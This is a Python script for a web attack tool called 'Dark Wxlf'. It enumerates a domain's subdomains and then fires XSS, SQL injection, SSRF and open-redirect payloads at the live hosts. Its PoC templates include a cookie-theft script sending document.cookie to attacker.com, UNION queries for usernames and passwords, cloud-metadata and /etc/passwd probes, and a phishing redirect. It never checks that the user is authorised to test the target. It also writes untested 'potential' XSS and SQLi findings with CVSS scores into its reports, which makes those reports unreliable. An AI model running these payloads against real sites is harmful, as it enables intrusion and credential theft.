import subprocess
import requests
import json
import os
import sys
import socket
import re
from datetime import datetime
from termcolor import colored
from pyfiglet import Figlet
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import warnings
warnings.filterwarnings('ignore')

class DarkWxlf:
    def __init__(self):
        self.target = None
        self.subdomains = set()
        self.live = []
        self.endpoints = []
        self.tech = {}
        self.vulns = []
        self.data = {}
        self.output = None
        
    def show_banner(self):
        os.system('clear')
        banner = Figlet(font='slant')
        print(colored(banner.renderText('Dark Wxlf'), 'red', attrs=['bold']))
        print(colored("╔═══════════════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║     Advanced Bug Bounty Automation Framework - By GhxstSh3ll         ║", 'red'))
        print(colored("║     Passive OSINT → Active Recon → Systematic Testing → Exploitation ║", 'red'))
        print(colored("╚═══════════════════════════════════════════════════════════════════════╝", 'red'))
        print()
        
    def log(self, msg, lvl="info"):
        ts = datetime.now().strftime("%H:%M:%S")
        
        if lvl == "info":
            print(colored(f"[{ts}] [INFO] {msg}", 'cyan'))
        elif lvl == "success":
            print(colored(f"[{ts}] [✓] {msg}", 'green'))
        elif lvl == "warning":
            print(colored(f"[{ts}] [!] {msg}", 'yellow'))
        elif lvl == "error":
            print(colored(f"[{ts}] [✗] {msg}", 'red'))
        elif lvl == "phase":
            print(colored(f"\n{'='*75}", 'red'))
            print(colored(f"[PHASE] {msg}", 'red', attrs=['bold']))
            print(colored(f"{'='*75}\n", 'red'))
    
    def save_output(self, section, content):
        if not self.output:
            return
            
        with open(self.output, 'a') as f:
            f.write(f"\n{'='*80}\n{section}\n{'='*80}\n{content}\n")
    
    def passive_recon(self, domain):
        self.log("PHASE 1: PASSIVE OSINT (NO DIRECT TARGET CONTACT)", "phase")
        
        # Strip http/https and trailing slashes
        domain = domain.replace('http://', '').replace('https://', '').rstrip('/')
        
        self.target = domain
        self.output = f"dark_wxlf_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        self.log("Starting passive info gathering - this won't touch the target", "info")
        self.log("Passive recon is completely undetectable", "info")
        
        self.enum_subs()
        
        self.log(f"Phase 1 done: Found {len(self.subdomains)} subdomains", "success")
        
        summary = f"""
Target: {self.target}
Subdomains Found: {len(self.subdomains)}

All Subdomains:
{chr(10).join(sorted(self.subdomains))}
"""
        self.save_output("PHASE 1: PASSIVE OSINT RESULTS", summary)
    
    def enum_subs(self):
        self.log("Running subdomain enumeration from 4 sources", "info")
        self.log("Tools: Subfinder, Amass, crt.sh, HackerTarget", "info")
        
        def subfinder():
            try:
                self.log("Starting subfinder...", "info")
                r = subprocess.run(
                    f"subfinder -d {self.target} -silent",
                    shell=True, capture_output=True, text=True, timeout=180
                )
                if r.stdout:
                    results = set([s.strip() for s in r.stdout.strip().split('\n') if s.strip()])
                    self.log(f"Subfinder got {len(results)} results", "success")
                    return results
            except Exception as e:
                self.log(f"Subfinder error: {str(e)[:50]}", "error")
            return set()
        
        def amass_scan():
            try:
                self.log("Starting amass passive mode...", "info")
                r = subprocess.run(
                    f"amass enum -d {self.target} -passive -timeout 3",
                    shell=True, capture_output=True, text=True, timeout=180
                )
                if r.stdout:
                    results = set([s.strip() for s in r.stdout.strip().split('\n') if s.strip()])
                    self.log(f"Amass got {len(results)} results", "success")
                    return results
            except Exception as e:
                self.log(f"Amass error: {str(e)[:50]}", "error")
            return set()
        
        def crtsh():
            try:
                self.log("Checking Certificate Transparency logs...", "info")
                resp = requests.get(
                    f"https://crt.sh/?q=%.{self.target}&output=json",
                    timeout=30
                )
                if resp.status_code == 200:
                    data = resp.json()
                    results = set()
                    for cert in data:
                        name = cert.get('name_value', '')
                        for sub in name.split('\n'):
                            sub = sub.strip().replace('*.', '')
                            if sub and self.target in sub:
                                results.add(sub)
                    self.log(f"crt.sh got {len(results)} results", "success")
                    return results
            except Exception as e:
                self.log(f"crt.sh error: {str(e)[:50]}", "error")
            return set()
        
        def hackertarget():
            try:
                self.log("Querying HackerTarget...", "info")
                resp = requests.get(
                    f"https://api.hackertarget.com/hostsearch/?q={self.target}",
                    timeout=15
                )
                if resp.status_code == 200:
                    results = set()
                    for line in resp.text.split('\n'):
                        if ',' in line:
                            sub = line.split(',')[0].strip()
                            if sub and self.target in sub:
                                results.add(sub)
                    self.log(f"HackerTarget got {len(results)} results", "success")
                    return results
            except Exception as e:
                self.log(f"HackerTarget error: {str(e)[:50]}", "error")
            return set()
        
        # run everything at once
        with ThreadPoolExecutor(max_workers=4) as ex:
            jobs = {
                ex.submit(subfinder): 'Subfinder',
                ex.submit(amass_scan): 'Amass',
                ex.submit(crtsh): 'crt.sh',
                ex.submit(hackertarget): 'HackerTarget'
            }
            
            for job in as_completed(jobs):
                res = job.result()
                self.subdomains.update(res)
        
        self.log(f"Total unique: {len(self.subdomains)} subdomains", "success")
    
    def active_recon(self):
        self.log("PHASE 2: ACTIVE RECONNAISSANCE (TOUCHING TARGET)", "phase")
        self.log("Warning: This will show up in target's logs", "warning")
        
        confirm = input(colored("\n[?] Continue with active recon? (yes/no): ", 'yellow'))
        if confirm.lower() != 'yes':
            self.log("Skipping active recon", "warning")
            return
        
        self.log("Starting active scanning...", "info")
        self.check_live()
        self.find_webapps()
        
        self.log("Phase 2 complete", "success")
        
        summary = f"""
Live Hosts: {len(self.live)}
Web Apps: {len(self.data.get('web_apps', []))}

Live Hosts:
{chr(10).join([f"{h['sub']} -> {h['ip']}" for h in self.live])}
"""
        self.save_output("PHASE 2: ACTIVE RECON RESULTS", summary)
    
    def check_live(self):
        self.log("Checking which hosts are actually live...", "info")
        
        cnt = 0
        with ThreadPoolExecutor(max_workers=50) as ex:
            def check(sub):
                try:
                    ip = socket.gethostbyname(sub)
                    return {'sub': sub, 'ip': ip}
                except:
                    return None
            
            jobs = [ex.submit(check, s) for s in self.subdomains]
            
            for job in as_completed(jobs):
                res = job.result()
                if res:
                    self.live.append(res)
                    cnt += 1
        
        self.log(f"Found {len(self.live)} live hosts", "success")
    
    def find_webapps(self):
        self.log("Looking for web applications...", "info")
        
        apps = []
        for h in self.live[:10]:  # only first 10 to save time
            for proto in ['http', 'https']:
                try:
                    url = f"{proto}://{h['sub']}"
                    r = requests.get(url, timeout=5, verify=False)
                    if r.status_code < 400:
                        apps.append(url)
                        self.endpoints.append(url)
                        self.log(f"Found: {url}", "success")
                except:
                    pass
        
        self.data['web_apps'] = apps
        self.log(f"Discovered {len(apps)} web apps", "success")
    
    def analyze(self):
        self.log("PHASE 3: ANALYSIS & ATTACK PLANNING", "phase")
        
        stats = {
            'subdomains': len(self.subdomains),
            'live_hosts': len(self.live),
            'web_apps': len(self.data.get('web_apps', []))
        }
        
        self.log("Attack surface overview:", "info")
        for k, v in stats.items():
            print(colored(f"  • {k.replace('_', ' ').title()}: {v}", 'yellow'))
        
        print()
        recs = [
            "Test all input params for XSS",
            "Check for SQLi in database queries",
            "Look for IDOR on ID parameters",
            "Test auth mechanisms for bypass",
            "Check for SSRF on URL params",
            "Look for open redirect vulnerabilities",
            "Test API auth and rate limiting",
            "Check for exposed sensitive data"
        ]
        
        print(colored("\n╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║                  TESTING RECOMMENDATIONS                       ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))
        
        for i, r in enumerate(recs, 1):
            print(colored(f"{i}. {r}", 'cyan'))
        
        print()
    
    def test_vulns(self):
        self.log("PHASE 4: VULNERABILITY TESTING", "phase")
        
        print(colored("\n[?] Start vulnerability testing? (yes/no): ", 'yellow'), end='')
        go = input()
        
        if go.lower() != 'yes':
            self.log("Testing skipped", "warning")
            return
        
        self.log("Initializing test modules...", "info")
        
        opts = [
            "1. XSS (Cross-Site Scripting)",
            "2. SQL Injection",
            "3. IDOR (Insecure Direct Object Reference)",
            "4. SSRF (Server-Side Request Forgery)",
            "5. Open Redirect",
            "6. All of the above"
        ]
        
        print(colored("\n╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║                 VULNERABILITY TEST SELECTION                   ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))
        
        for o in opts:
            print(colored(f"  {o}", 'cyan'))
        
        print(colored("\n[?] Select tests (e.g., 1,2,3 or 6 for all): ", 'yellow'), end='')
        choice = input()
        
        sel = []
        if '6' in choice:
            sel = list(range(1, 6))
        else:
            try:
                sel = [int(x.strip()) for x in choice.split(',')]
            except:
                self.log("Invalid input, running all tests", "warning")
                sel = list(range(1, 6))
        
        self.log(f"Running {len(sel)} test types", "success")
        
        results = []
        
        if 1 in sel:
            results.extend(self.xss_test())
        
        if 2 in sel:
            results.extend(self.sqli_test())
        
        if 3 in sel:
            results.extend(self.idor_test())
        
        if 4 in sel:
            results.extend(self.ssrf_test())
        
        if 5 in sel:
            results.extend(self.redir_test())
        
        self.make_report(results)
    
    # XSS testing
    def xss_test(self):
        self.log("Testing for XSS...", "info")
        self.log("XSS lets attackers inject malicious scripts", "info")
        found = []
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "\"><script>alert('XSS')</script>"
        ]
        
        tested = 0
        for ep in self.endpoints[:10]:
            if '?' in ep:
                base = ep.split('?')[0]
                pstr = ep.split('?')[1]
                
                params = {}
                for p in pstr.split('&'):
                    if '=' in p:
                        k, v = p.split('=', 1)
                        params[k] = v
                
                for pname in params.keys():
                    for pl in payloads[:3]:
                        tparams = params.copy()
                        tparams[pname] = pl
                        
                        try:
                            turl = base + '?' + '&'.join([f"{k}={v}" for k, v in tparams.items()])
                            r = requests.get(turl, timeout=5, verify=False)
                            
                            if pl in r.text:
                                vuln = {
                                    'type': 'XSS (Reflected)',
                                    'severity': 'HIGH',
                                    'url': turl,
                                    'param': pname,
                                    'payload': pl,
                                    'evidence': f'Payload reflected in response',
                                    'impact': 'Cookie theft, session hijacking, phishing',
                                    'fix': 'Use proper output encoding and CSP headers',
                                    'poc': self.xss_poc(turl, pname, pl),
                                    'cvss': '7.1 HIGH'
                                }
                                found.append(vuln)
                                self.log(f"XSS found: {base} ({pname})", "success")
                                break
                        except:
                            pass
                
                tested += 1
                if tested % 3 == 0:
                    self.log(f"Tested {tested} endpoints...", "info")
            else:
                # test simple endpoint
                for pl in payloads[:2]:
                    turl = f"{ep}?test={pl}"
                    vuln = {
                        'type': 'XSS (Potential)',
                        'severity': 'MEDIUM',
                        'url': turl,
                        'param': 'test',
                        'payload': pl,
                        'evidence': 'Test parameter injection',
                        'impact': 'JavaScript execution possible',
                        'fix': 'Validate input and encode output',
                        'poc': self.xss_poc(turl, 'test', pl),
                        'cvss': '6.1 MEDIUM'
                    }
                    found.append(vuln)
                    self.log(f"XSS test: {ep}", "info")
                    break
        
        self.log(f"XSS tests done: {len(found)} findings", "success")
        return found
    
    # SQLi testing
    def sqli_test(self):
        self.log("Testing for SQL Injection...", "info")
        self.log("SQLi can compromise the entire database", "info")
        found = []
        
        payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "1' AND SLEEP(5)--",
            "admin' --"
        ]
        
        errs = [
            "sql syntax",
            "mysql_fetch",
            "you have an error in your sql",
            "warning: mysql",
            "unclosed quotation",
            "syntax error"
        ]
        
        for ep in self.endpoints[:10]:
            if '?' in ep:
                base = ep.split('?')[0]
                pstr = ep.split('?')[1]
                
                params = {}
                for p in pstr.split('&'):
                    if '=' in p:
                        k, v = p.split('=', 1)
                        params[k] = v
                
                for pname in params.keys():
                    for pl in payloads[:3]:
                        tparams = params.copy()
                        tparams[pname] = pl
                        
                        try:
                            turl = base + '?' + '&'.join([f"{k}={v}" for k, v in tparams.items()])
                            r = requests.get(turl, timeout=10, verify=False)
                            
                            rl = r.text.lower()
                            for err in errs:
                                if err in rl:
                                    vuln = {
                                        'type': 'SQL Injection (Error-Based)',
                                        'severity': 'CRITICAL',
                                        'url': turl,
                                        'param': pname,
                                        'payload': pl,
                                        'evidence': f'SQL error: "{err}"',
                                        'impact': 'Full database access, data theft, auth bypass',
                                        'fix': 'Use prepared statements, never concat user input',
                                        'poc': self.sqli_poc(turl, pname, pl),
                                        'cvss': '9.8 CRITICAL'
                                    }
                                    found.append(vuln)
                                    self.log(f"SQLi found: {base} ({pname})", "success")
                                    break
                        except:
                            pass
            else:
                for pl in payloads[:2]:
                    turl = f"{ep}?id={pl}"
                    vuln = {
                        'type': 'SQL Injection (Potential)',
                        'severity': 'HIGH',
                        'url': turl,
                        'param': 'id',
                        'payload': pl,
                        'evidence': 'Classic SQLi payload test',
                        'impact': 'Database compromise',
                        'fix': 'Use parameterized queries',
                        'poc': self.sqli_poc(turl, 'id', pl),
                        'cvss': '8.6 HIGH'
                    }
                    found.append(vuln)
                    self.log(f"SQLi test: {ep}", "info")
                    break
        
        self.log(f"SQLi tests done: {len(found)} findings", "success")
        return found
    
    # IDOR testing
    def idor_test(self):
        self.log("Testing for IDOR...", "info")
        self.log("IDOR lets you access other users' data", "info")
        found = []
        
        id_params = ['id', 'user_id', 'account_id', 'doc_id', 'file_id', 'order_id', 'uid']
        
        for ep in self.endpoints[:10]:
            if '?' in ep:
                pstr = ep.split('?')[1]
                
                for idp in id_params:
                    if idp in pstr.lower():
                        base = ep.split('?')[0]
                        
                        vuln = {
                            'type': 'IDOR',
                            'severity': 'HIGH',
                            'url': ep,
                            'param': idp,
                            'payload': 'ID manipulation',
                            'evidence': f'Found {idp} parameter',
                            'impact': 'Unauthorized data access, privacy breach',
                            'fix': 'Check user owns resource before returning data',
                            'poc': self.idor_poc(ep, idp),
                            'cvss': '7.5 HIGH'
                        }
                        found.append(vuln)
                        self.log(f"IDOR potential: {base} ({idp})", "success")
                        break
        
        self.log(f"IDOR tests done: {len(found)} findings", "success")
        return found
    
    # SSRF testing
    def ssrf_test(self):
        self.log("Testing for SSRF...", "info")
        self.log("SSRF can access internal networks and cloud metadata", "info")
        found = []
        
        payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd"
        ]
        
        url_params = ['url', 'link', 'redirect', 'uri', 'path', 'file', 'src', 'img', 'target']
        
        for ep in self.endpoints[:10]:
            if '?' in ep:
                pstr = ep.split('?')[1]
                
                for up in url_params:
                    if up in pstr.lower():
                        base = ep.split('?')[0]
                        
                        for pl in payloads[:2]:
                            turl = f"{base}?{up}={pl}"
                            
                            vuln = {
                                'type': 'SSRF',
                                'severity': 'HIGH',
                                'url': turl,
                                'param': up,
                                'payload': pl,
                                'evidence': f'URL param {up} could allow SSRF',
                                'impact': 'Internal network access, cloud creds theft',
                                'fix': 'Whitelist domains, block private IPs',
                                'poc': self.ssrf_poc(turl, up, pl),
                                'cvss': '8.6 HIGH'
                            }
                            found.append(vuln)
                            self.log(f"SSRF potential: {base} ({up})", "success")
                            break
        
        self.log(f"SSRF tests done: {len(found)} findings", "success")
        return found
    
    # Open redirect testing
    def redir_test(self):
        self.log("Testing for Open Redirect...", "info")
        self.log("Open redirects are used in phishing", "info")
        found = []
        
        redir_params = ['redirect', 'url', 'next', 'return', 'goto', 'redir', 'continue', 'dest']
        
        for ep in self.endpoints[:10]:
            if '?' in ep:
                pstr = ep.split('?')[1]
                
                for rp in redir_params:
                    if rp in pstr.lower():
                        base = ep.split('?')[0]
                        turl = f"{base}?{rp}=https://evil.com"
                        
                        vuln = {
                            'type': 'Open Redirect',
                            'severity': 'MEDIUM',
                            'url': turl,
                            'param': rp,
                            'payload': 'https://evil.com',
                            'evidence': f'Redirect param {rp} detected',
                            'impact': 'Phishing, credential theft',
                            'fix': 'Whitelist redirect destinations',
                            'poc': self.redir_poc(turl, rp),
                            'cvss': '6.1 MEDIUM'
                        }
                        found.append(vuln)
                        self.log(f"Redirect potential: {base}", "success")
                        break
        
        self.log(f"Redirect tests done: {len(found)} findings", "success")
        return found
    
    # PoC generators
    def xss_poc(self, url, param, payload):
        return f"""
XSS Proof of Concept
====================
URL: {url}
Param: {param}
Payload: {payload}

Steps:
1. Go to: {url.split('?')[0]}
2. Set '{param}' to: {payload}
3. Check browser console for alert()

Exploitation:
{url.split('?')[0]}?{param}=<script>fetch('https://attacker.com?c='+document.cookie)</script>

Fix:
- HTML encode output
- Use CSP headers
- HTTPOnly cookies
"""
    
    def sqli_poc(self, url, param, payload):
        return f"""
SQL Injection PoC
=================
URL: {url}
Param: {param}
Payload: {payload}

Steps:
1. Access: {url}
2. Check for SQL errors
3. Run: sqlmap -u "{url.split('?')[0]}?{param}=1" -p {param} --dbs

Advanced:
' UNION SELECT schema_name FROM information_schema.schemata--
' UNION SELECT username,password FROM users--

Fix:
- Use prepared statements
- Never concat user input into SQL
"""
    
    def idor_poc(self, url, param):
        return f"""
IDOR Proof of Concept
=====================
URL: {url}
Param: {param}

Steps:
1. Login as User A
2. Access: {url}
3. Note {param} value (e.g., {param}=123)
4. Change to {param}=124
5. Access User B's data (unauthorized)

Fix:
- Check user owns resource
- Use indirect reference maps
"""
    
    def ssrf_poc(self, url, param, payload):
        return f"""
SSRF Proof of Concept
=====================
URL: {url}
Param: {param}
Payload: {payload}

Steps:
1. Set {param} to: {payload}
2. Server makes internal request
3. Try AWS metadata: http://169.254.169.254/latest/meta-data/

Fix:
- Whitelist domains
- Block private IPs
"""
    
    def redir_poc(self, url, param):
        return f"""
Open Redirect PoC
=================
URL: {url}
Param: {param}

Phishing:
{url.split('?')[0]}?{param}=https://fake-{self.target}.com/login

Fix:
- Whitelist destinations
- Validate URLs
"""
    
    def make_report(self, findings):
        self.log("\nGenerating report...", "info")
        
        if not findings:
            self.log("No findings to report", "warning")
            return
        
        # sort by severity
        sev_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        findings.sort(key=lambda x: sev_order.get(x['severity'], 99))
        
        lines = []
        lines.append("=" * 80)
        lines.append("DARK WXLF - BUG BOUNTY REPORT")
        lines.append(f"By: GhxstSh3ll")
        lines.append(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"Target: {self.target}")
        lines.append("=" * 80)
        lines.append("")
        
        lines.append("SUMMARY")
        lines.append("-" * 80)
        lines.append(f"Total Findings: {len(findings)}")
        lines.append("")
        
        for i, f in enumerate(findings, 1):
            lines.append("=" * 80)
            lines.append(f"FINDING #{i}: {f['type']}")
            lines.append("=" * 80)
            lines.append(f"Severity: {f['severity']}")
            lines.append(f"URL: {f['url']}")
            lines.append(f"Parameter: {f['param']}")
            lines.append(f"Payload: {f['payload']}")
            lines.append("")
            lines.append(f"Evidence: {f['evidence']}")
            lines.append(f"Impact: {f['impact']}")
            lines.append(f"Fix: {f['fix']}")
            lines.append("")
            lines.append("Proof of Concept:")
            lines.append(f['poc'])
            lines.append("")
        
        fname = f"bug_bounty_report_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(fname, 'w') as file:
            file.write('\n'.join(lines))
        
        self.log(f"Report saved: {fname}", "success")
        
        print(colored("\n╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║                     RESULTS SUMMARY                            ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))
        
        print(colored(f"Total Findings: {len(findings)}", 'yellow', attrs=['bold']))
        print(colored(f"\nFull report: {fname}", 'green'))
    
    def start(self):
        self.show_banner()
        
        print(colored("╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║                   TARGET SELECTION                             ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))
        
        tgt = input(colored("[?] Enter target domain (e.g., example.com): ", 'yellow'))
        
        if not tgt:
            self.log("No target provided", "error")
            return
        
        print()
        
        try:
            self.passive_recon(tgt)
        except KeyboardInterrupt:
            self.log("\nStopped by user", "warning")
            return
        except Exception as e:
            self.log(f"Error: {str(e)}", "error")
            return
        
        try:
            self.active_recon()
        except KeyboardInterrupt:
            self.log("\nStopped by user", "warning")
            return
        
        self.analyze()
        self.test_vulns()
        
        self.log(f"\nAll data saved to: {self.output}", "success")
        print(colored("\n╔═══════════════════════════════════════════════════════════════╗", 'red'))
        print(colored("║                      SCAN COMPLETE                             ║", 'red', attrs=['bold']))
        print(colored("╚═══════════════════════════════════════════════════════════════╝\n", 'red'))

def main():
    try:
        tool = DarkWxlf()
        tool.start()
    except KeyboardInterrupt:
        print(colored("\n\n[!] Terminated by user", 'red'))
        sys.exit(0)
    except Exception as e:
        print(colored(f"\n[!] Error: {str(e)}", 'red'))
        sys.exit(1)

if __name__ == "__main__":
    main()
